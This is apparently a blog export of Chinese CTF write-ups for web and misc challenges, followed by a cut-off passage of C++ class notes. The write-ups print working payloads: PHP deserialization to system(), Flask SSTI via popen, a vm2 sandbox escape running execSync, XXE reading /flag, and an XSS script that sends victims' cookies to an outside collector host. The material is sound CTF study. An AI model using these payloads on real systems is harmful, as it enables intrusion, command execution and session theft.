?&gt;\n\n也就是我们的参数里面必须带有woofers或者meowers或者index。我们这里可以利用include()函数的特性：\ninclude() 有一个特性：当包含文件失败时，它不会终止脚本的执行，而是发出一个警告（E_WARNING）并继续执行。这也就是为什么有警告，但程序又正常执行了(实际上包含失败不会出结果，这是上面报警告的原因)\n当然也有可能是其他原因\n\nPHP 的伪协议解析机制:\nPHP 的 php://filter 伪协议解析器可能具有一定的容错性。\n如果 index 不是一个有效的过滤器名称，PHP 可能会忽略它，并继续解析后面的部分（即 convert.base64-encode 和 resource=flag.php）。\n\n\nindex 被解释为路径的一部分:\n在某些情况下，index 可能被解释为路径的一部分，而不是过滤器的名称。\n例如，PHP 可能将 index/resource=flag.php 视为路径的一部分，而 convert.base64-encode 仍然是有效的过滤器。\n\n\nPHP 的隐式行为:\nPHP 的伪协议解析器可能会尝试“修复”错误的语法，忽略无效的部分并继续处理有效的部分。\n\n\n\npayload\nphp://filter/convert.base64-encode/index/resource=flag\n\n\n\n\n\n24.[网鼎杯 2020 朱雀组]phpweb这个题目界面什么都没有，但在不停的刷新，我们抓个包看下\n\n\n我们发现了有POST传参，然后又获得了时间(日期对但时间差了8个小时)，我们观察传参发现\n很有可能是这种形式\ndate(m-d+h%3Ai%3As+a);\n\n这让我想起了之前有个函数(call_user_func)可以让第一个参数作为函数名，后面的参数作为函数的参数，我们尝试下include包含\ncall_user_func() expects parameter 1 to be a valid callback, function &#x27;include&#x27; not found or invalid function name in &lt;b&gt;/var/www/html/index.php\n\n但是这个函数好像不支持include\n又尝试了一下命令执行，但是好像把我知道的命令执行函数全部过滤掉了\n这里我是看了题解才知道的，我们可以尽可能以各种方式去获取源代码，这里我们可以通过file_get_contents()函数去拿到index.php\n这里我们拿到index.php的源码\n&lt;?php    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) &#123;        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == &quot;string&quot;) &#123;            return $result;        &#125; else &#123;return &quot;&quot;;&#125;    &#125;    class Test &#123;        var $p = &quot;Y-m-d h:i:s a&quot;;        var $func = &quot;date&quot;;        function __destruct() &#123;            if ($this-&gt;func != &quot;&quot;) &#123;                echo gettime($this-&gt;func, $this-&gt;p);            &#125;        &#125;    &#125;    $func = $_REQUEST[&quot;func&quot;];    $p = $_REQUEST[&quot;p&quot;];    if ($func != null) &#123;        $func = strtolower($func);        if (!in_array($func,$disable_fun)) &#123;            echo gettime($func, $p);        &#125;else &#123;            die(&quot;Hacker...&quot;);        &#125;    &#125;    ?&gt;\n\n过滤掉的关键字好多，但没有过滤掉unserialize()，而且还有类的存在，这题估计是用反序列化。\n整个题目的核心是gettime()函数，程序有两次使用到了这个函数，一次是绕过正则后，一次是__destruct()方法调用。那么思路有了\n&lt;?phpclass Test &#123;    var $p = &quot;cat `find / -name f*`&quot;;    var $func =&#x27;system&#x27;;&#125;$a = new Test();echo urlencode(serialize($a));?&gt;\n\n我们对类进行序列化，第一次函数执行会进行反序列化，创建实例，第二次则会进行命令执行。但是这个题目还有点奇怪，他把flag藏得比较深，根目录下面没有，只能使用find查找\npayload:\nfunc=unserialize&amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A21%3A%22cat+%60find+%2F+-name+f%2A%60%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\n\n\n\n25.[MRCTF2020]Ezpopclass Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;\n\n这个题目首先是一个反序列化的题目，但是还是类太多了，有点绕。我们还是使用反推法从flag推到序列化\n&lt;?phpclass Modifier &#123;protected  $var=&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;;//直接php伪协议读取flagpublic function append($value)&#123;include($value);//1.这里存在文件包含，猜测flag在这里&#125;public function __invoke()&#123;$this-&gt;append($this-&gt;var);//2.通过触发__invoke触发文件包含&#125;&#125;class Show&#123;public $source;public $str;public function __construct($file=&#x27;index.php&#x27;)&#123;$this-&gt;source = $file;echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;//7.echo触发__toString()  &#125;public function __toString()&#123;//6.想办法触发__toString()return $this-&gt;str-&gt;source;//5.这里存在访问，当str=Test()时，Test()访问不存在source触发__get()  &#125;public function __wakeup()&#123;if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;echo &quot;hacker&quot;;$this-&gt;source = &quot;index.php&quot;;    &#125;  &#125;&#125;class Test&#123;public $p;public function __get($key)&#123;//4.想办法触发__get$function = $this-&gt;p;return $function();//3.这里function作为函数名，我们使function为Show，触发__invoke&#125;&#125;$Modfier=new Modifier();$Show=new Show();$Test=new Test();$Test-&gt;p=$Modfier;$Show-&gt;source=new Show();//这里Show里面实例化自己，实际上触发__toString()的是后面实例化的Show$Show-&gt;source-&gt;str=$Test;echo urlencode(serialize($Show));\n\n\n\n"},{"title":"Buuctf3-0","url":"/2025/04/17/Buuctf3-0/","content":"Buuctf3.0笔记服了，做的题目太多了吧，我还是等下再把写的题目给单独拿出来吧\n51.[CISCN2019 华东南赛区]Double Secret首先题目提示我们Welcome To Find Secret我们尝试访问/sectet，发现Tell me your secret.I will encrypt it so others can&#39;t see\n根据题目给出的Double Secret我们猜测第二个secret为传参，我们发现GET传入secret的时候有回显，我们随便输入一大串字符时期报错，我们成功进入其Debug界面(一看就是SSTI)，我们可以选择pin值计算但是太浪费时间了，优先直接用SSTI进行命令执行\n\n\n我们发现这么一串代码\nif (secret == None):    return &#x27;Tell me your secret.I will encrypt it so others can\\&#x27;t see&#x27;rc = rc4_Modified.RC4(&quot;HereIsTreasure&quot;)  # 解密deS = rc.do_crypt(secret)#将密匙的加密结果放入解密函数#将我们的输入进行解密a = render_template_string(safe(deS))#解密后的参数经过过滤后进行模板渲染，这里存在SSTI注入if &#x27;ciscn&#x27; in a.lower():    return &#x27;flag detected!&#x27;return a\n\n这个代码中rc4_Modified.RC4不是python自带的加密函数，而是自定义的，他将HereIsTreasure作为密匙，基于这个字符串进行加密\n我们需要基于HereIsTreasure作为密匙去写一个RC4的加密程序，我自己肯定写不出来，直接抄大佬的\nimport base64from urllib import parsedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):#返回加密后得内容    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_boxdef rc4_excrypt(plain, box):    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    cipher = &quot;&quot;.join(res)    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))key = &quot;HereIsTreasure&quot;  #此处为密文message = input(&quot;请输入明文:\\n&quot;)enc_base64 = rc4_main( key , message )enc_init = str(base64.b64decode(enc_base64),&#x27;utf-8&#x27;)enc_url = parse.quote(enc_init)print(&quot;rc4加密后的url编码:&quot;+enc_url)#print(&quot;rc4加密后的base64编码&quot;+enc_base64)\n\n我们每次注入还得进行加密，好麻烦啊\npayload:\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;&#123;&#123;lipsum.__globals__&#125;&#125;#不知道为什么会报错，说找不到os模块，结果果然没找到，不会pythonbu&#x27;tong，那就换一个&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /flag.txt&#x27;).read()&#125;&#125;#这个可以找到\n\n\n\n\n\n\n\n52.[WMCTF2020]Make PHP Great Again&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;  require_once $_GET[&#x27;file&#x27;];&#125;\n\n这个代码太简单了，我还以为是一个简单的文件包含，但是当我包含flag.php的时候没反应，\n在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含，那么我们该如何绕过呢(具体原理太难了，只能先看看payload了)\n在这里有个小知识点，/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:\nphp://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\n其中的原理太难了，看了一下发现应该是php为了验证我们提供的路径是否被包含了会对我们路径进行处理然后去查找，利用对/proc/self和/proc/self/root/的特殊处理使得绕过php的检查再次包含flag.php\n53.[HFCTF2020]JustEscape我就说我怎么根本看不懂这个题目，我又去看了一遍题解，说是沙箱逃逸(听过好几次，但自己根本看不懂)\n我们直接访问run.php，拿到\n&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;    $code = $_GET[&#x27;code&#x27;];    echo eval(code);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;\n\n我只能说拿个简单的php代码迷惑我，实际上这是个js的题目，根本不知道一点，题解说是把code这个参数进行处理()\n我们可以抄一下github上vm2沙箱逃逸的代码\n&quot;use strict&quot;;const &#123;VM&#125; = require(&#x27;vm2&#x27;);const untrusted = &#x27;(&#x27; + function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123;  Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123;  return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125;&#125;+&#x27;)()&#x27;;try&#123; console.log(new VM().run(untrusted));&#125;catch(x)&#123; console.log(x);&#125;\n\n这个代码的原理是一点都不懂的，wp说过滤了一些关键字，我们不能直接使用\npayload\n(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`ls /`).toString();    &#125;&#125;)()\n\n\n\n54.[CSAWQual 2019]Web_Unagi这个题目是一个文件上传的题目，题目提示我们上传文件的格式\n&lt;users&gt;&lt;user&gt;&lt;username&gt;alice&lt;/username&gt;&lt;password&gt;passwd1&lt;/password&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;email&gt;alice@fakesite.com&lt;/email&gt;&lt;group&gt;CSAW2019&lt;/group&gt;&lt;/user&gt;&lt;user&gt;&lt;username&gt;bob&lt;/username&gt;&lt;password&gt;passwd2&lt;/password&gt;&lt;name&gt; Bob&lt;/name&gt;&lt;email&gt;bob@fakesite.com&lt;/email&gt;&lt;group&gt;CSAW2019&lt;/group&gt;&lt;/user&gt;&lt;/users&gt;\n\n这是一个典型的xml，看来是一个XXE的题目\nXXE一般是直接上模板的，但是这题wp说会被waf拦截下来，我们需要更改编码，将utf-8改为utf-16。\n我们先直接用模板读取&#x2F;flag\n&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;!DOCTYPE users [&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;users&gt;    &lt;user&gt;        &lt;username&gt;111&lt;/username&gt;        &lt;password&gt;111&lt;/password&gt;        &lt;name&gt; 111&lt;/name&gt;        &lt;email&gt;1111@fakesite.com&lt;/email&gt;        &lt;group&gt;CSAW2019&lt;/group&gt;        &lt;intro&gt;&amp;admin;&lt;/intro&gt;    &lt;/user&gt;&lt;/users&gt;\n\n他们说可以通过vscode直接改编码，但是我一直不行，还是用的\ncat 1.xml | iconv -f UTF-8 -t UTF-16BE &gt; 2.xml\n\n但是后面自己去试了一下才发现是教程有问题\n\n\n只能点击下面这个编码方式，上面那个是直接根据类似ascii进行转换会乱码，下面那个则是在保证内容不变的情况下改变编码\n55.[BSidesCF 2019]SVGMagic这是个文件上传的题目，有提示Convert SVG to PNG with Magic\n翻译过来就是将SVG转换为PNG（使用Magic）\nSVG是一种用XML定义的语言，SVG图形是可交互的和动态的，可以在SVG文件中嵌入动画元素或通过脚本来定义动画。\n也就是说这里的SVG是个XML,并且存在可控的内容，那么自然就会想到XXE\n首先我们要知道，XML 被设计用来传输和存储数据。然后这个漏洞就是利用了，应用程序在解析XML输入时，没有禁止外部实体的加载。就拿下面的这个来说&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;，这个就是外部实体，加载了flag.txt,然后输出，也就是：应该是实体引用，把加载的东西放出来&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt;\n\n也就是我们和其他的XML文档一样通过加载外部实体拿到flag，只不过这次需要用到的是svg格式的xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt;\n\n\n\n56.[FireshellCTF2020]Caas这个题目就一个输入框，且有提示Welcome guest! Please input your code below and we will compile it for you.\n看了题解之后才知道，这是叫我们写C语言的代码，\n我们先尝试一下Hello World\n#include &lt;stdio.h&gt; int main() &#123;    printf(&quot;Hello, World! \\n&quot;);    return 0;&#125;\n\n下载下来一个文件，但是不知道是什么类型的文件，没拿到什么有用的信息\n题解说这题是通过include进行一个文件读取，当我们读取无法解析的文件时虽然回报错，但是报错信息会显示读取的文件信息\npayload\n#include &quot;/flag&quot;\n\n\n"},{"title":"[CISCN_2021初赛]robot","url":"/2025/09/27/CISCN-2021%E5%88%9D%E8%B5%9B-robot/","content":"[CISCN_2021初赛]robot一开始我刚学杂项的时候感觉杂项就是为了做题，不知道有什么用，但是web太牢了，正式比赛有一些题目太难了，这个时候发现杂项也能拿分，于是杂项的作用就体现出来了，现在杂项也需要写题解积累一下\n题目提示\n提交的flag为NSSCTF{md5(what_you_get)}\n我们下载附件下来是一个流量包，然后现在我知道了，看哪个协议的流量包多就追踪哪个流就行了，这次是TCP多一点，直接追踪发现\n\n\n有这些后面带有序号和坐标的流量，看了wp知道这是考通过坐标来绘图得到答案\n主要思路就是先将追踪流导出然后通过正则匹配到所有的坐标，然后再通过python的绘图功能将这些坐标用像素点画出来\n正则脚本\nimport re  # 导入正则表达式模块# 打开文件 &#x27;1.txt&#x27; 并读取全部内容a = open(&#x27;1111.txt&#x27;)b = a.read()# 使用正则表达式匹配特定模式# 正则模式解释：r&#x27;tgPos\\&#123;\\d+&#125;\\.Value\\.\\[\\d+,\\d+,\\d+]&#x27;z = re.findall(r&#x27;tgPos\\&#123;\\d+&#125;\\.Value\\.\\[\\d+,\\d+,\\d+]&#x27;, b)# 将匹配结果写入新文件with open(&quot;result.txt&quot;, &quot;w&quot;) as file:    for s in z:  # 遍历所有匹配结果        file.write(s + &#x27;\\n&#x27;)  # 每个结果单独一行写入\n\n得到txt文件\n\n\n然后再让ai写一个绘图脚本，线下赛不能用ai怎么办啊，虽然还没进过线下赛\nfrom PIL import Imageimport rex = 400y = 200  # 查看最大坐标得知图片大致大小im = Image.new(&quot;RGB&quot;, (x, y))n = 0with open(&#x27;result.txt&#x27;, &#x27;r&#x27;) as f:    for r1 in f:        n = n + 1        # 添加错误处理，避免正则匹配失败导致程序崩溃        match = re.search(r&#x27;\\[(.*?)]&#x27;, r1)        if match:            r2 = str(match[1])            # 匹配任意字符（.），重复任意次数（*），使用非贪婪模式（?）            a = list(map(int, r2.split(&quot;,&quot;)))            # 确保坐标在图像范围内，避免越界错误            if 0 &lt;= a[0] &lt; x and 0 &lt;= a[1] &lt; y:                im.putpixel((a[0], a[1]), (255, 255, 255))            else:                print(f&quot;警告：第&#123;n&#125;行坐标(&#123;a[0]&#125;,&#123;a[1]&#125;)超出图像范围&quot;)        else:            print(f&quot;警告：第&#123;n&#125;行未找到坐标数据: &#123;r1.strip()&#125;&quot;)# 显示图片（可选）im.show()# 保存图片到文件output_filename = &quot;output.png&quot;  # 可以改为你想要的文件名im.save(output_filename)print(f&quot;图片已保存为: &#123;output_filename&#125;&quot;)# 也可以保存为其他格式# im.save(&quot;output.jpg&quot;)    # JPEG格式# im.save(&quot;output.bmp&quot;)    # BMP格式\n\n然后得到一张图片\n\n\n直接MD5加密即可拿到flag\nNSSCTF&#123;d4f1fb80bc11ffd722861367747c0f10&#125;\n\n","tags":["正则","坐标绘图"]},{"title":"[CISCN2019_华东北赛区]Web2","url":"/2025/09/10/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/","content":"[CISCN2019_华东北赛区]Web2题目进入是一个登录注册界面，我们进行注册登录进入发现是一个博客界面，可以发表评论\n\n\n输入的数据会回显到一个html文件中，第一时间猜是SSTI和XSS，后面发现是XSS，但是大佬说过滤的太多东西只能使用HTML Markup(html中的一种编码)进行绕过，然后使用的payload我也是看不懂\n(function()&#123;  window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=arHAGx&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();\n\n这里主要是通过一个window.location.href重定向到我们的vps，在URL上接了一堆数据用于外带和DNS外带有点像。查询数据是通过document.location.href这样的形式查找的，然后使用escape将URL的特殊字符和非ASCII字符进行编码，然后就是进行Markup编码了\nxss=&#x27;&#x27;&#x27;(function()&#123;window.location.href=&#x27;http://10.88.15.120:7777/index.php?do=api&amp;id=arHAGx&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();&#x27;&#x27;&#x27;output = &quot;&quot;for c in xss:    output += &quot;&amp;#&quot; + str(ord(c))print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)\n\n将字符转为ASCII码然后在前面加上&amp;#即Markup编码和URL差不多\n我们将拿到的数据上传然后访问html文件监听到数据，但是这个是我们账号的session，没用\n我们再看反馈界面发现\n\n\n反馈内容下面提示我们放URL，然后还说会亲自查看即Admin账号，但是需要我们输入验证码，直接爆破md5\n&lt;?phpfor($i=1;$i&lt;=100000000;$i++)&#123;    if(substr(md5($i),0,6)===&quot;7f3baa&quot;) &#123;        echo $i;        echo &quot;&lt;br&gt;&quot;;        echo md5($i);        break;    &#125;&#125;\n\n然后我们再提交发现监听到了Admin的PHPSESSIONID\n\n\n我们放入Cookie中然后访问admin.php发现有一个查询框\n\n\n发现参数是一个数字型参数，直接联合注入拿到flag\n"},{"title":"[CISCN_2023_华北]ez_date","url":"/2025/09/26/CISCN-2023-%E5%8D%8E%E5%8C%97-ez-date/","content":"[CISCN_2023_华北]ez_date&lt;?phperror_reporting(0);highlight_file(__FILE__);class date&#123;    public $a;    public $b;    public $file;    public function __wakeup()    &#123;        if(is_array($this-&gt;a)||is_array($this-&gt;b))&#123;            die(&#x27;no array&#x27;);        &#125;        if( ($this-&gt;a !== $this-&gt;b) &amp;&amp; (md5($this-&gt;a) === md5($this-&gt;b)) &amp;&amp; (sha1($this-&gt;a)=== sha1($this-&gt;b)) )&#123;            $content=date($this-&gt;file);            $uuid=uniqid().&#x27;.txt&#x27;;            file_put_contents($uuid,$content);            $data=preg_replace(&#x27;/((\\s)*(\\n)+(\\s)*)/i&#x27;,&#x27;&#x27;,file_get_contents($uuid));            echo file_get_contents($data);        &#125;        else&#123;            die();        &#125;    &#125;&#125;unserialize(base64_decode($_GET[&#x27;code&#x27;])); \n\n这个题目就比较考对PHP的理解了，首先就是需要对MD5进行一个绕过\nif( ($this-&gt;a !== $this-&gt;b) &amp;&amp; (md5($this-&gt;a) === md5($this-&gt;b)) &amp;&amp; (sha1($this-&gt;a)=== sha1($this-&gt;b)) )\n\n这个一开始我是看得有点懵逼了，没学过什么时候md5和sha1同时碰撞，但是仔细一看代码和题目发现可以使用\n$a=1;$b=&#x27;1&#x27;;\n\n进行绕过，之前没考虑到这种情况主要是因为之前基本不是反序列化而是传参的形式，只能传递字符串\nMD5绕过后就需要文件读取了\n$content=date($this-&gt;file);$uuid=uniqid().&#x27;.txt&#x27;;file_put_contents($uuid,$content);$data=preg_replace(&#x27;/((\\s)*(\\n)+(\\s)*)/i&#x27;,&#x27;&#x27;,file_get_contents($uuid));echo file_get_contents($data);\n\n之前遇到过date这个函数，是用来获取当前时间的，而且我还不知道这个能有参数。\ndate()\nstring date ( string $format [, int $timestamp = time() ] )\n\n\n$format：格式化字符串，定义输出时间的格式\n$timestamp：可选的时间戳（默认当前时间）\n\n当 date() 遇到无法识别的格式化字符时：\n\n如果字符前有反斜杠 \\，会直接输出字符本身\n如果字符前没有反斜杠，会输出空字符串\n\n&lt;?phpecho date(&#x27;/\\f\\l\\a\\g&#x27;);//   /flag\n\n也就是说我们可以通过转义符号让date函数输出指定字符串，然后这个题目后面又出现一个正则\n$data=preg_replace(&#x27;/((\\s)*(\\n)+(\\s)*)/i&#x27;,&#x27;&#x27;,file_get_contents($uuid));            echo file_get_contents($data);\n\n也就是将我们写入txt文件中的内容通过正则替换然后再将内容进行文件读取输出，虽然我认为不替换也没关系，但是莫非这个是为了传说中的预期解而设定的，主要就是将空白字符和回车符替换为空\n于是我们的思路就是绕过MD5然后通过date函数将/flag写入txt文件中然后经过绕过最后通过文件读取到flag\nclass date&#123;    public $a=&#x27;1&#x27;;    public $b=1;    public $file=&#x27;/\\f\\l\\a\\g&#x27;;&#125;$a=new dateecho base64_encode(serialize($a));\n\n\n\n但是这个题目在绕过MD5的时候突然想起之前接触到的另外一种写法，就是如果这个题目在比较字符串不同时用的松散比较那么通过数据类型进行绕过就是不行的，但是可以利用Error原生类返回报错信息实现绕过\n我们先运行代码\n&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\\r\\n\\r\\n&quot;;echo $b;//var_dump($a===$b);\n\n\n\n我们可以看到返回的字符串是一个报错信息，我们的第一个参数会被写入报错语句中，然后两个语句需要写在同一行不然报错信息中行数也是不一样的\n然后就是绕过松散比较了，php中对象的松散比较只会比较属性和类，不会像严格比较一样比较内存，所以我们只要在第二个参数中传入不一样的字符即可\n\n\n最后再来看下payload\n&lt;?phpclass date&#123;public $a ;public $b;public $file = &quot;/\\\\f\\l\\a\\g&quot;;&#125;$a = new date;$a-&gt;a = new Error(&quot;payload&quot;,1);$a-&gt;b = new Error(&quot;payload&quot;,2);echo base64_encode(serialize($a));\n\n","tags":["Error原生类绕过MD5","MD5绕过"]},{"title":"C++面向对象编程","url":"/2025/12/04/C-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/","content":"C++面向对象编程为什么计科要从C++开始学面向对象编程，一开始以为反正都是面向对象编程，以为会和Java差不多，结果一看发现还是没有Java方便，到现在又要期末考试了，只能趁着实验课来补一下不会的。\n妈的，上次这么复习的还是汇编，我复习了整整一个星期啊，看了十多个小时的教程，结果被那傻逼试卷给背刺了，不仅题目变成了一几年的类型题目好多，题目难度更是逆天，本来靠写概念题我都可以及格，结果概念题几乎没有，还全部是算地址的题目。如果老师不在我那个只写了框架的程序设计题多给点分的话我肯定挂科了。\nC++的面向过程还是和其他语言一致的，语法上应该只有输入和输出和C语言不一样\n1.类与对象类和对象没什么特别的，所有面向对象编程概念都是差不多的，只不过语法上有一些差别。\n类的定义\n定义一个类需要使用关键字 class，然后指定类的名称，并类的主体是包含在一对花括号中，主体包含类的成员变量和成员函数。\n定义一个类，本质上是定义一个数据类型的蓝图，它定义了类的对象包括了什么，以及可以在这个对象上执行哪些操作。\n\n\n我们来看一个实例\nclass Box&#123;   public:      double length;   // 盒子的长度      double breadth;  // 盒子的宽度      double height;   // 盒子的高度&#125;;\n\n我们可以注意到，和Java不同的就是C++没有对class进行修饰符修饰，这样就意味着所有类都是可以在其他类中被访问然后进行实例化。不像在Java中比如Runtime类就是private的，也就是不能直接被new，需要调用方法getRuntime返回一个Runtime对象。C++中通过对变量和函数进行修饰来实现封装\n然后就是C++不能像python和Java那样，直接通过import语句进行引用，而是通过include语句去引用一个.h文件。一开始学C语言的时候不知道#include &lt;stdio.h&gt;的作用是什么，只是每次都写上，其实现在也不知道到底是为了使用哪个方法才去引用它\n我们在写面向对象的程序的时候就会看到.h文件中的内容类似\n//student.h#pragma once #include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt; class Grade &#123;private:    double math; // 数学成绩    double english; // 英语成绩    double programming; // 编程成绩public:    Grade();    Grade(double _math, double _english, double _programming);    void set_math(double _math);    void set_english(double _english);    void set_programming(double _programming);    double get_math() const;    double get_english() const;    double get_programming() const;&#125;;\n\n这样的目的就是将我们在对应的student.cpp文件中定义的类和函数在这里进行一个声明，然后在其他.cpp文件中只需要include &quot;student.h&quot;，然后我们就可以访问到h中声明的函数和类了，也可以选择在h文件中声明变量。\n然后就是只要在h文件中引入的文件在对应的cpp文件中只需要include &quot;student.h&quot;就相当于引入了\n我们还需要注意，类的定义有两种方式。分别是单独一个cpp文件和h&#x2F;cpp文件。\n单独cpp文件\n//就是不依赖h文件的声明，直接在cpp文件中写类的所有信息// student.cpp - 最简单的学生类示例#include &lt;iostream&gt;#include &lt;string&gt;// 1. 定义Student类class Student &#123;public:    // 构造函数    Student(std::string n, int a) &#123;        name = n;        age = a;    &#125;        // 成员函数：显示信息    void show() &#123;        std::cout &lt;&lt; &quot;姓名: &quot; &lt;&lt; name                   &lt;&lt; &quot;, 年龄: &quot; &lt;&lt; age &lt;&lt; std::endl;    &#125;        // 成员函数：庆祝生日    void birthday() &#123;        age++;        std::cout &lt;&lt; name &lt;&lt; &quot; 过生日啦！现在 &quot; &lt;&lt; age &lt;&lt; &quot; 